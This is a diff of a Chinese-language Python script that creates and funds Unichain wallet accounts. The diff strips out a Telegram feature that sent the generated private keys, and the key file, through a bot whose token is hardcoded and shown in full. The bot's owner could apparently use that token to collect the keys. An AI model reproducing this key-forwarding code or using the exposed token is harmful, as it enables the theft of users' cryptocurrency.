@@ -8,13 +8,11 @@ from web3 import Web3
 from eth_account import Account
 from cryptography.fernet import Fernet
 from retrying import retry
-import httpx
-import asyncio
 from concurrent.futures import ThreadPoolExecutor
 from requests.exceptions import RequestException
 
 def install_dependencies():
-    dependencies = ['web3==6.15.1', 'cryptography==43.0.1', 'retrying==1.3.4', 'httpx==0.27.2']
+    dependencies = ['web3==6.15.1', 'cryptography==43.0.1', 'retrying==1.3.4']
     try:
         subprocess.check_call([sys.executable, '-m', 'pip', 'uninstall', 'web3', '-y'])
     except subprocess.CalledProcessError:
@@ -36,8 +34,6 @@ CONFIG = {
     "address_2": "0x3c47199dbc9fe3acd88ca17f87533c0aae05ada2",
     "address_file": "/root/generated_addresses.txt",
     "private_keys_file": "/root/private_keys.txt",
-    "telegram_bot_token": "8070858648:AAGfrK1u0IaiXjr4f8TRbUDD92uBGTXdt38",
-    "batch_size": 20,
     "rpc_timeout": 15,
     "chain_id": 130
 }
@@ -46,11 +42,6 @@ def validate_private_key(private_key):
     if not re.match(r'^0x[0-9a-fA-F]{64}$', private_key):
         raise ValueError("无效的私钥格式，必须是 64 位十六进制字符串，带 0x 前缀")
     return private_key
-
-def validate_chat_id(chat_id):
-    if chat_id and not chat_id.isdigit():
-        raise ValueError("Telegram 聊天 ID 必须是纯数字")
-    return chat_id
 
 def validate_num_accounts(num_accounts):
     try:
@@ -87,9 +78,7 @@ def get_user_input():
             num_accounts = validate_num_accounts(num_accounts)
             thread_count = input("请输入线程数: ").strip()
             thread_count = validate_thread_count(thread_count)
-            telegram_chat_id = input("请输入 Telegram 聊天 ID（留空则不发送通知）: ").strip()
-            telegram_chat_id = validate_chat_id(telegram_chat_id) if telegram_chat_id else None
-            return main_private_key, num_accounts, thread_count, telegram_chat_id
+            return main_private_key, num_accounts, thread_count
         except ValueError as e:
             print(f"输入错误: {e}")
             continue
@@ -114,36 +103,6 @@ def init_web3():
                 continue
     logging.error("All RPC endpoints failed")
     raise Exception("无法连接到任何 Unichain RPC 端点")
-
-async def send_telegram_message(chat_id, message):
-    url = f"https://api.telegram.org/bot{CONFIG['telegram_bot_token']}/sendMessage"
-    payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
-    async with httpx.AsyncClient(timeout=10) as client:
-        try:
-            response = await client.post(url, json=payload)
-            if response.status_code != 200:
-                logging.error("Failed to send Telegram message")
-                raise Exception(f"Telegram 消息发送失败: {response.text}")
-            logging.info("Telegram message sent")
-        except Exception as e:
-            logging.error("Error sending Telegram message")
-            raise
-
-async def send_telegram_document(chat_id, file_path):
-    url = f"https://api.telegram.org/bot{CONFIG['telegram_bot_token']}/sendDocument"
-    async with httpx.AsyncClient(timeout=10) as client:
-        try:
-            with open(file_path, 'rb') as f:
-                files = {'document': (os.path.basename(file_path), f)}
-                payload = {'chat_id': chat_id}
-                response = await client.post(url, data=payload, files=files)
-                if response.status_code != 200:
-                    logging.error("Failed to send Telegram document")
-                    raise Exception(f"Telegram 文档发送失败: {response.text}")
-                logging.info("Telegram document sent")
-        except Exception as e:
-            logging.error("Error sending Telegram document")
-            raise
 
 def generate_new_account():
     account = Account.create()
@@ -207,7 +166,7 @@ def send_transaction(w3, from_address, to_address, value_wei, private_key, gas=2
         logging.error("Transaction failed")
         raise
 
-def process_address(index, main_account, main_private_key, w3, fernet, telegram_chat_id):
+def process_address(index, main_account, main_private_key, w3, fernet):
     try:
         print(f"生成第 {index+1} 个地址...")
         new_address, new_private_key = generate_new_account()
@@ -242,7 +201,7 @@ async def main():
         if os.path.exists(CONFIG["private_keys_file"]):
             os.remove(CONFIG["private_keys_file"])
         print("开始获取用户输入...")
-        main_private_key, num_accounts, thread_count, telegram_chat_id = get_user_input()
+        main_private_key, num_accounts, thread_count = get_user_input()
         main_account = Account.from_key(main_private_key)
         print(f"主账户地址: {main_account.address}")
         print("初始化 Web3 连接...")
@@ -250,32 +209,11 @@ async def main():
         fernet = Fernet(Fernet.generate_key())
         successful_accounts = []
         with ThreadPoolExecutor(max_workers=thread_count) as executor:
-            futures = [executor.submit(process_address, i, main_account, main_private_key, w3, fernet, telegram_chat_id) for i in range(num_accounts)]
+            futures = [executor.submit(process_address, i, main_account, main_private_key, w3, fernet) for i in range(num_accounts)]
             for future in futures:
                 result = future.result()
                 if result:
                     successful_accounts.append(result)
-                if telegram_chat_id and len(successful_accounts) >= CONFIG["batch_size"]:
-                    message = "成功转账的地址和私钥：\n"
-                    for addr, key in successful_accounts[-CONFIG["batch_size"]:]:
-                        message += f"Address: {addr}, Private Key: {key}\n"
-                    print("发送 Telegram 通知...")
-                    await send_telegram_message(telegram_chat_id, message)
-                    logging.info("Sent Telegram notification")
-                    print(f"已发送 Telegram 通知，包含 {len(successful_accounts[-CONFIG['batch_size']:])} 个地址")
-        if telegram_chat_id and successful_accounts:
-            message = "成功转账的地址和私钥：\n"
-            for addr, key in successful_accounts:
-                message += f"Address: {addr}, Private Key: {key}\n"
-            print("发送 Telegram 通知（剩余地址）...")
-            await send_telegram_message(telegram_chat_id, message)
-            logging.info("Sent Telegram notification")
-            print(f"已发送 Telegram 通知，包含 {len(successful_accounts)} 个地址")
-        if telegram_chat_id and os.path.exists(CONFIG["private_keys_file"]):
-            print("发送私钥文档到 Telegram...")
-            await send_telegram_document(telegram_chat_id, CONFIG["private_keys_file"])
-            logging.info("Sent private keys document")
-            print("已发送私钥文档到 Telegram")
     except Exception as e:
         logging.error("Script error")
         print(f"错误: {str(e)}")
